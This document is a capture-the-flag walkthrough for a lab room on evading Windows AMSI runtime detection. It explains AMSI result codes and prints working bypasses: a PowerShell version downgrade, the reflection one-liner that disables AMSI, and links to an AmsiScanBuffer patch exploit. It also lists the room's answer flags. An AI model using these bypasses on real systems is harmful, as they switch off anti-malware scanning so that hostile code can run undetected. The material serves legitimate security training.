# Runtime Detection Evasion - Hard

1. [Runtime Detections](#runtime-detections)
2. [AMSI Overview](#amsi-overview)
3. [AMSI Instrumentation](#amsi-instrumentation)
4. [PowerShell Downgrade](#powershell-downgrade)
5. [PowerShell Reflection](#powershell-reflection)
6. [Patching AMSI](#patching-amsi)
7. [Automating for Fun and Profit](#automating-for-fun-and-profit)

## Runtime Detections

* CLR (Common Language Runtime) and DLR (Dynamic Language Runtime) are the runtimes for .NET and are used in Windows systems.

* A runtime detection measure will scan code before execution in the runtime and determine if it is malicious or not; if code is suspected to be malicious, it will be assigned a value, and if within a certain range, it will stop execution, quarantine and/or delete the file.

* Runtime detection measures are different from standard AV because they scan directly from memory and runtime.

* AMSI (Anti-Malware Scan Interface) is a runtime detection measure shipped natively with Windows.

```markdown
1. What runtime detection measure is shipped natively with Windows? - AMSI
```

## AMSI Overview

* AMSI is a PowerShell security feature that will allow any app/service to integrate directly into anti-malware products.

* AMSI will determine its actions from a response code (reported on AMSI backend), as a result of monitoring & scanning:

  * AMSI_RESULT_CLEAN = 0
  * AMSI_RESULT_NOT_DETECTED = 1
  * AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
  * AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
  * AMSI_RESULT_DETECTED = 32768

```markdown
1. What response value is assigned to 32768? - AMSI_RESULT_DETECTED
```

## AMSI Instrumentation

* AMSI is instrumented from ```System.Management.Automation.dll```, a .NET assembly developed by Windows.

```markdown
1. Will AMSI be instrumented if the file is only on disk? - N
```

## PowerShell Downgrade

```shell
#downgrade PowerShell version in cmd.exe
PowerShell -Version 2

#get flag
type .\Desktop\flag.txt
```

```markdown
1. Enter the flag obtained from the desktop after executing the command in cmd.exe. - THM{p0w3r5h3ll_d0wn6r4d3!}
```

## PowerShell Reflection

* Reflection allows user to access & interact with .NET assemblies.

* PowerShell reflection can be abused to modify & identify info from valuable DLLs.

```shell
#in cmd
PowerShell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

```markdown
1. Enter the flag obtained from the desktop after executing the command. - THM{r3fl3c7_4ll_7h3_7h1n65}
```

## Patching AMSI

* The ```AmsiScanBuffer``` function is vulnerable because ```amsi.dll``` is loaded into the PowerShell process at startup; our session has the same permission level as the utility.

* ```AmsiScanBuffer``` will scan a 'buffer' of suspected code and report it to ```amsi.dll``` to get response; we can control this function and overwrite the buffer with a clean return code.

* We can use the [given exploit](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs) for AmsiScanBufferBypass.

```markdown
1. Enter the flag obtained from the desktop after executing the command. - THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}
```

## Automating for Fun and Profit

* [amsi.fail](http://amsi.fail/)
* [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
